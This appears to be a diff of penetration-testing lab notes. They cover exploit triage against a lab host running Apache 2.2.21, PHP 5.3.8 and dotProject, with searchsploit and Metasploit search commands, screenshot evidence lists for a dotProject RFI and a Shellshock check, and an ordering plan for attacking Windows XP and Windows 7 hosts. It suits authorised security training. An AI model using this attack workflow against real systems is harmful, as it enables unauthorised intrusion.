-| **B — research / maybe** | `linux/webapps/42745.py` — **Apache &lt; 2.2.34 / &lt; 2.4.27 — OPTIONS memory leak** | Your server is **2.2.21** → **in range** for this class of issue; often **info leak / DoS**, not instant shell — still worth **reading** for class. |
-| **C — skip for shell** | `linux/dos/41769.txt` — **mod_setenvif integer overflow** | **DoS**, not reliable for proof-of-compromise in most labs. |
-| **Parallel (app)** | `searchsploit dotproject` — RFI/SQLi/XSS/auth-bypass rows under **`php/webapps/`** (see screenshot) | Pick entries that match **fingerprinted dotProject version**; paths like **`/modules/.../foo.php`** are under **`/dotproject/`** on this host. |
-
-**Commands to drill into an option (safe prep):**
-
-```bash
-# Read exploit text / prerequisites (always do this first)
-searchsploit -x php/remote/18836.py
-searchsploit -x php/remote/29316.py
-searchsploit -x linux/webapps/42745.py
-
-# Copy exploit into cwd for editing
-searchsploit -m php/remote/18836.py
-searchsploit -m php/remote/29316.py
-
-# Metasploit may have modules for PHP-CGI / Apache — search after you know CVE
-msfconsole -q -x "search php cgi 2012; search apache 2.2; exit"
-
-# dotProject app exploits — read the matching Exploit-DB path, then mirror script paths under http://$RHOST_102/dotproject/
-searchsploit -x php/webapps/XXXXX.py
-```
-
-**Reality check:** Many rows in `searchsploit php 5.3.8` are **unrelated apps** (Drupal, WordPress plugins, etc.) — **ignore** unless that software is on **`.102`**. Your **confirmed** stack is **Apache 2.2.21 + PHP 5.3.8 + dotProject** — **Tier A + dotProject** stay in scope; everything else is noise until fingerprinted.
+| nmap / http-enum | `recon_nmap_102_initial_tm6_afrocha.png`, `recon_nmap_102_http_enum_headers_tm6_afrocha.png` |
+| curl root / dotproject | `recon_curl_root_302_dotproject_tm6_afrocha.png`, `recon_curl_dotproject_301_tm6_afrocha.png`, `recon_curl_dotproject_https_attempts_tm6_afrocha.png` |
+| Version + login | `recon_curl_dotproject_index_php_200_meta_tm6_afrocha.png`, `recon_dotproject_login_html_2_1_6_tm6_afrocha.png` |
+| Advisory | `searchsploit_dotproject_2_1_6_rfi_gantt_dPconfig_tm6_afrocha.png` |
+| Chronological **102-*** | `102-001_curl_gantt_si_200_tm6_afrocha.png` … `102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png` (see also `102-002`, `102-003` in repo) |
+| Nikto | `recon_nikto_102_http80_banner_redirect_tm6_afrocha.png`, `recon_nikto_102_dotproject_paths_shellshock_tm6_afrocha.png` |
+| MSF Shellshock `check` | `exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png` |
+| searchsploit menus | `searchsploit_apache_2_2_21_tm6_afrocha.png`, `searchsploit_php_5_3_8_*.png`, `searchsploit_dotproject_tm6_afrocha.png` |
+
+Screenshot naming **`102-NNN_…`**: [parent README](../README.md) + [`.cursor` rule](../../.cursor/rules/ept-evidence-screenshots.mdc).
 
 ---
 
@@ -559,8 +232,8 @@ C:\> dir /s /b proof.txt 2>nul & dir /s /b local.txt 2>nul
 
 ## Ordering suggestion (one operator on KALI6)
 
-1. **.102** — Often fastest **web/Shellshock** path to a shell; low collision with SMB-heavy Windows work.  
+1. **.102** — **dotProject RFI / web** first (validated path); Shellshock and generic MSF noise archived under [`unfruitful_attempts/`](unfruitful_attempts/README.md).  
 2. **.100** — **XP/SMB** classics; do while you have Metasploit workspace warm.  
 3. **.101** — **Win7** harder target; use creds or results from **.100** lateral moves if the scenario allows.
 
-Document **what you ran**, **what failed**, and **screenshots** under [`../Screenshots/`](../Screenshots/) before promoting to team [`../../1_Screenshots/`](../../1_Screenshots/).
+Document **what you ran**, **what failed** ([`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)), and **screenshots** under [`../Screenshots/`](../Screenshots/) before promoting to team [`../../1_Screenshots/`](../../1_Screenshots/).
